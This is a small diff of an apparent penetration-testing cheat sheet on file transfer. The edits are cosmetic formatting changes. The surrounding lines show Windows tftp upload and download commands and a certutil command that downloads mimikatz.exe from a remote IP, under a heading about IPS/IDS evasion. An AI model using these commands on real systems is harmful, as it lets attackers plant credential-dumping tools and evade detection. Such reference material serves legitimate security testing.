@@ -23,15 +23,16 @@ atftpd --daemon --port 69 /tftp
 ```
 On Windows
 ```
-• Upload
+➤  Upload
 tftp -i http://192.168.119.194:8000/ put filename
-• Download 
+➤  Download 
 tftp -i http://192.168.119.194:8000/ get filename
 ```
 
 #### Certutil
-```
+
 Basic transfert
+```
 certutil.exe -urlcache -split -f http://192.168.119.194:8000/mimikatz.exe output.file
 ```
 Encoded transfert - Basic IPS/IDS evasion
